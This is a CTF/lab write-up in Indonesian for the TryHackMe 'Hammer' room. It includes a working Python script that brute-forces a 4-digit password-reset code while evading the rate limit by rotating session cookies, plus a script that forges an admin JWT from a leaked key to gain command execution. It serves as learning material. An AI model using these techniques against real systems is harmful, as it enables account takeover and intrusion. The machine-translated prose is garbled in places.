# TryHackMe Hammer Writeup

> Writeup ini dibuat untuk dokumentasi pembelajaran CTF/lab TryHackMe **Hammer**.

## Informasi Target

```text
Target IP : <TARGET_IP>
Port      : 1337
URL       : http://<TARGET_IP>:1337
Domain    : hammer.thm
```

Tambahkan ke `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Isi:

```text
<TARGET_IP> hammer.thm
```

Akses:

```text
http://hammer.thm:1337
```

---

## 1. Recon

Pemindaian Peta

Kami mulai dengan pemindaian peta dan menemukan dua port terbuka. Di atas pelabuhan  22kami memiliki SSH dan di pelabuhan  1337Kami memiliki server web Apache.
![Recon nmap](recon%20nmap.jpg)

---

## 2. Pemindaian Direktori Dan Manuel Enum dari 1337

Karena titik masuk kami mungkin adalah server web, kami memindai kemungkinan direktori dan halaman menggunakan Feroxbuster sambil menyebutkan target secara manual.
![Recon firefox](recon%20firefox.png)

Kami menemukan beberapa halaman dan direktori. Di antara mereka PhpMyAdmin. Jadi kita berurusan dengan server web PHP. Terlepas dari ini, bagaimanapun, tidak ada yang lain, kecuali bahwa folder CSS terlihat agak aneh.

┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
└─$ feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
                                                                                                                      


Mengunjungi halaman indeks dengan pencacahan manual membawa kita langsung ke halaman login. 
![Halaman web login hammer thm](halamanwebloginhammer%20thm.png)

Dalam sumbernya, kita menemukan konvensi yang disebutkan di antara para direktori. Ini dimulai dengan hmr_.
![Endpoint hammer thm](endpointnhammer%20thm.png)

Jadi kita mengedit wordlist bekas dengan melakukan prepending  hmr_dan scan lagi.

cp /usr/share/wordlists/dirb/big.txt .
sed 's/^/hmr_/' big.txt > hmr_big.txt

![Feroxbuster2](feroxbuster2%20.png)

Kami sekarang menemukan direktori hmr_logs, yang memiliki daftar direktori diaktifkan. Direktori ini berisi  error.logsberkas.

┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
└─$ feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
                                                                                                                      
---

## 3. Melewati Login

Dengan informasi yang kami kumpulkan sejauh ini, kami sekarang harus berkonsentrasi pada login.
![Halaman web login hammer thm](halamanwebloginhammer%20thm.png)

---

## 4. Login Analisis Halaman

Ini hanya menampilkan pesan generik untuk email dan kata sandi yang dimasukkan, dari mana kita tidak dapat menyimpulkan bahwa email atau kata sandi yang salah telah dimasukkan. Kekuatan kasar murni untuk menghitung email karena itu tidak mungkin di sini.
Tetapi halaman login memiliki tautan ke fitur kata sandi yang terlupakan /reset_password.php. Ini memberikan pesan kesalahan jika surat yang dipilih salah, secara teoritis surat yang valid dapat disebutkan dengan cara ini.
![End point reset password](endpointreset%20password.png)

---

## 5.Mendapatkan Alamat E-Mail yang Valid

Mengingatkan pencairan menggunakan daftar kata yang ditempati kami dapat menemukan email di   error.logs.Ada kegagalan otentikasi untuk pengguna tester@hammer.thm.
![End point log login](endpointlog%20login.png)

---

## 6. Eksploitasi Fitur Reset Password

Ketika mencoba untuk mengatur ulang password untuk pengguna ini, ...
![Halaman reset password udah dapetunsername](halamanrestepassword%20udahdapetunsername.png)

... penyedap halaman dan kita harus memasukkan kode 4 digit untuk mengubah kata sandi. Selain itu, ada batas waktu  180beberapa detik untuk memasukkan kode ini. Untuk prosedur dan analisis lebih lanjut, kami mencegat pengiriman kode 4 digit menggunakan burp suite.
![Burpsuite1](burpsuite1%20.png)

Dengan setiap permintaan yang sekarang dibuat, nilai Rate-Limit-Pending dalam header respons berkurang. Awalnya ini dimulai pada 8.
![Burp suite2](burpsuite2%20.png)

Setelah nilai turun ke 0Batas tarif tercapai dan token tidak dapat diatur ulang. Pada titik ini saya kehilangan banyak waktu karena saya berpikir bahwa dengan setiap reset token juga akan diatur ulang. Di bawah asumsi ini, saya pikir saya hanya bisa mendapatkan token dengan sedikit keberuntungan dan kesempatan. 

Oleh karena itu, saya menulis naskah yang membuat  100permintaan pada saat yang sama dengan berbeda PHPSESSIDs dengan harapan mendapatkan reset yang valid dengan token reset tetap. Bahkan, setelah beberapa upaya saya memiliki token permintaan yang valid, tetapi  100respon yang sama, untuk setiap sesi token tetap adalah valid. 

Baru kemudian saya menyadari bahwa token bertahan dalam jangka waktu itu selama setiap sesi yang dibuat, dan tidak mengatur ulang dirinya dengan sesi baru. Asumsi dapat dibuat dengan melihat bahwa token bertahan  180detik.
![Burp suite3](burpsuite3%20.png)

Untuk memverifikasi bahwa token reset bertahan, kami meminta reset baru tanpa cookie untuk mendapatkan sesi baru.
![Burp suite4](burpsuite4%20.png)

Kemudian kita menempatkan  PHPSESSIDdari respon ke dalam permintaan kami, dan melihat bahwa kita memiliki 8 upaya lagi, sampai  180Detik sudah berlalu.
![Burp suite5](burpsuite5%20.png)

Dengan informasi yang kami miliki, kami dapat mengotomatiskan proses pemulihan kata sandi yang melanggar brute. Pertama kali meminta reset kata sandi dan mengambil  PHPSESSIDcookie, kemudian secara berulang kali mengirimkan kode pemulihan dengan cara brute-force, secara berkala menyegarkan  PHPSESSIDsetiap permintaan ketujuh. Skrip mendeteksi pengiriman kode yang sukses dengan memeriksa perubahan dalam jumlah kata teks respons.

	import subprocess
	
	def get_phpsessid():
	    # Request Password Reset and retrieve the PHPSESSID cookie
	    reset_command = [
	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
	        "-d", "email=tester%40hammer.thm",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-v"
	    ]
	
	    # Execute the curl command and capture the output
	    response = subprocess.run(reset_command, capture_output=True, text=True)
	
	    # Extract PHPSESSID from the response
	    phpsessid = None
	    for line in response.stderr.splitlines():
	        if "Set-Cookie: PHPSESSID=" in line:
	            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
	            break
	
	    return phpsessid
	
	def submit_recovery_code(phpsessid, recovery_code):
	    # Submit Recovery Code using the retrieved PHPSESSID
	    recovery_command = [
	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
	        "-d", f"recovery_code={recovery_code}&s=180",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-H", f"Cookie: PHPSESSID={phpsessid}",
	        "--silent"
	    ]
	
	    # Execute the curl command for recovery code submission
	    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
	    return response_recovery.stdout
	
	def main():
	    phpsessid = get_phpsessid()
	    if not phpsessid:
	        print("Failed to retrieve initial PHPSESSID. Exiting...")
	        return
	    
	    for i in range(10000):
	        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
	
	        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
	            phpsessid = get_phpsessid()
	            if not phpsessid:
	                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
	                continue
	        
	        response_text = submit_recovery_code(phpsessid, recovery_code)
	        word_count = len(response_text.split())
	
	        if word_count != 148:
	            print(f"Success! Recovery Code: {recovery_code}")
	            print(f"PHPSESSID: {phpsessid}")
	            print(f"Response Text: {response_text}")
	            break
	
	if __name__ == "__main__":
	    main()


Setelah kami menjalankan naskah, kami menerima kode pemulihan yang valid,  PHPSESSIDdan tubuh respon.
![Script python brup](scriptpython%20brup.png)

---

## 7. Atur Ulang Kata Sandi

Yang harus kita lakukan sekarang adalah mengatur PHPSESSID di browser dan memuat ulang halaman.Setelah kami memuat ulang halaman, kami dapat mengatur ulang kata sandi untuk pengguna tester@hammer.thm.
![Web bikin pass baru](webbikinpass%20baru.png)

Kami memilih password baru.Kami kemudian login dengan kredensial baru ...
... dan diteruskan ke dashboard. Kami melihat bahwa kami memiliki peran user, dapat memasuki perintah dan disambut dengan bendera pertama. Setelah waktu yang singkat, kita akan keluar.


... dan diteruskan ke dashboard. Kami melihat bahwa kami memiliki peran user, dapat memasuki perintah dan disambut dengan bendera pertama. Setelah waktu yang singkat, kita akan keluar.
![Halaman login menggunakan username](halamanloginmenggunakan%20username.png)


---

## 8. RCE

Pertama kita melihat apa yang memungkinkan kita log out, dalam sumber kita melihat script yang memeriksa cookie setelah interval dan jika kondisi tidak terpenuhi, kita login keluar. Jika jika  persistentSessiontidak diatur ke True, kita akan ditebang. Dengan menggunakan alat OWASP ZAP, kami dapat menetapkan nilai ini secara permanen, tetapi kami juga dapat melanjutkan penyelidikan kami menggunakan Burp Suite tanpa dilunasmi.
![Ctrl u di halaman web yg sudah login](ctrludihalamanwebygsudah%20login.png)

Selain itu, ada naskah yang mendengarkan acara klik pada  #submitCommandtombol dan mengambil input perintah oleh pengguna. Kemudian mengirimkan permintaan AJAX POST ke execute_command.php, termasuk perintah dan token JWT di header permintaan untuk otorisasi. Setelah menerima tanggapan, ia menampilkan hasil atau pesan kesalahan dalam  #commandOutputelemen. Skrip ini bertanggung jawab atas transmisi perintah.
![Jwt token](jwt%20token.png)

---

## 9. Analisis Perintah Eksekusi

Kami mencegat permintaan untuk mentransfer perintah menggunakan Burp Suite. Kami melihat token di header dan di cookie. Selain itu, kami tidak diizinkan untuk melaksanakan perintah ID. Kami menggunakan FFuF dengan daftar kata untuk memeriksa perintah mana yang dapat digunakan.
![Burp suite6](burpsuite6%20.png)

Berkas Kunci

Tampaknya kita hanya bisa mengeksekusi perintah mereka. Selain halaman dan direktori yang sudah kita ketahui ada  .keyfile yang hadir. Kami ingat bahwa peran pengguna kami ditampilkan di dasbor. Ada kemungkinan bahwa peran lain dapat mengeksekusi lebih banyak.
![Burp suite7](burpsuite7%20.png)

Penciptaan Token JWT

Kami menganalisis token JWT menggunakan  jwt.iodan dapat membuat struktur, di header a  kiddiatur, yang menunjuk ke file kunci yang terletak di  /var/www/mykey.key. Selanjutnya token berisi pengguna peran. Mungkin dengan peran lain seperti admin kita akan dapat melaksanakan perintah sewenang-wenang.
![Jwtio1](jwtio1%20.png)

Kami ingat daftar kami  lsperintah, di sini kita punya file kunci. File kunci berisi nilai hash. Mungkin rahasia untuk menandatangani token JWT. Jadi kita mungkin bisa membuat token kita sendiri, karena kita memiliki akses ke rahasia dan dapat menebak lokasi token untuk anak itu.

Kami menggunakan skrip python untuk membuat token dengan peran admin, kami memasukkan saluran konten  4dan jalan dari garis rahasia 10. Kami juga menetapkan tanggal kedaluwarsa sedikit lebih tinggi untuk kami.

	import jwt
	
	
	secret_key = "REDACTED"
	
	
	header = {
	    "typ": "JWT",
	    "alg": "HS256",
	    "kid": "/var/www/html/REDACTED.key"
	}
	
	
	payload = {
	    "iss": "http://hammer.thm",
	    "aud": "http://hammer.thm",
	    "iat": 1725193591,
	    "exp": 1725199591,
	    "data": {
	        "user_id": 1,
	        "email": "tester@hammer.thm",
	        "role": "admin"
	    }
	}
	
	# Encode the JWT with the specific header
	token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
	
	# Print the generated token
	print(token)

Menjalankan script, kita mendapatkan token, ditandatangani dengan rahasia, yang terletak di folder root web.
![Run script jwt](runscript%20jwt.png)

Menggunakan jwt.ioKami dapat mengkonfirmasi konten barunya.
![Jwtio2](jwtio2%20.png)

Eksekusi Kode Jarak Jauh Sewenang-wenang

Selanjutnya, kami mengganti nilai token dalam header Otorisasi dan nilai cookie token. Setelah itu, kami dapat melaksanakan perintah sewenang-wenang sebagai admin. Dengan menggunakan ID yang kita lihat, kita www-data.
![Burp suite8](burpsuite8%20.png)

Sebagai sebagai  www-datakita dapat mengambil bendera kedua di /home/ubuntu.flag.txt
![Burp suite9](burpsuite9%20.png)

Ringkasan

Dalam tantangan ini kami menghadapi aplikasi web yang rentan di server Apache. Pemindaian Nmap mengidentifikasi SSH di pelabuhan  22dan server web di port 1337. Setelah pemindaian direktori dan pencacahan manual, kami menemukan halaman PhpMyAdmin dan  hmr_logsDirektori yang berisi  error.logsberkas. Log mengungkapkan email yang valid (tester@hammer.thm), yang kami gunakan untuk mengeksploitasi fitur reset kata sandi.

Mekanisme reset kata sandi rentan terhadap serangan brute-force, karena memungkinkan beberapa upaya untuk menebak kode reset 4 digit dalam batas waktu, melewati batas tarifnya dengan mengambil sesi baru setiap permintaan ke-7. Dengan mengotomatisasi proses brute-force dan menghindari batas tarif, kami berhasil me-reset kata sandi pengguna. Setelah masuk, kami mendapat bendera pertama dan menganalisis dan memanipulasi token JWT untuk meningkatkan hak istimewa kami admin, memungkinkan eksekusi perintah sewenang-wenang sebagai  www-datadan mengambil bendera kedua di /home/ubuntu.flag.txt.

---

## Troubleshooting

### 1. `400 Bad Request`

Penyebab umum:

```text
JWT kepotong menjadi beberapa baris
Cookie header rusak
Content-Length tidak sesuai
Body JSON tidak valid
```

Body harus valid JSON:

```json
{"command":"ls"}
```

---

### 2. `Missing JWT`

Artinya token tidak terkirim.

Contoh salah:

```http
Authorization: Bearer
```

Contoh benar:

```http
Authorization: Bearer eyJ...
```

---

### 3. `Expired token`

Token ada, tetapi `exp` sudah lewat.

Gunakan timestamp dinamis:

```python
now = int(time.time())

"iat": now,
"exp": now + 3600
```

---

### 4. `Signature verification failed`

Artinya signature JWT tidak cocok.

Penyebab umum:

```text
secret_key salah
kid salah
token di Authorization dan Cookie beda
token diedit tapi tidak di-sign ulang
```

Pastikan:

```python
secret_key = "<ISI_SECRET_KEY>"
```

bukan:

```python
secret_key = "188ade1"
```

kecuali isi file key memang `188ade1`.

---

### 5. `Command not allowed`

JWT sudah terbaca, tetapi command ditolak oleh filter aplikasi.

Coba command yang memang allowed, misalnya:

```json
{"command":"ls"}
```

Untuk membaca flag setelah admin token valid:

```json
{"command":"cat /home/ubuntu/flag.txt"}
```

---

## Kesimpulan

Room Hammer mengeksploitasi beberapa kelemahan berantai:

```text
Exposed logs       -> mendapatkan email valid
Weak OTP reset     -> reset password akun
JWT kid weakness   -> menemukan key file
JWT forgery        -> membuat token admin
Admin command exec -> membaca flag
```

Hal penting:

```text
Token tidak harus sama dengan writeup orang lain.
JWT akan berubah jika iat, exp, secret, kid, payload, atau session berbeda.
Yang penting token diterima server dan tidak menghasilkan error signature/expired.
```

---

## Flag

```text
Flag 1: THM{REDACTED}
Flag 2: THM{REDACTED}
```
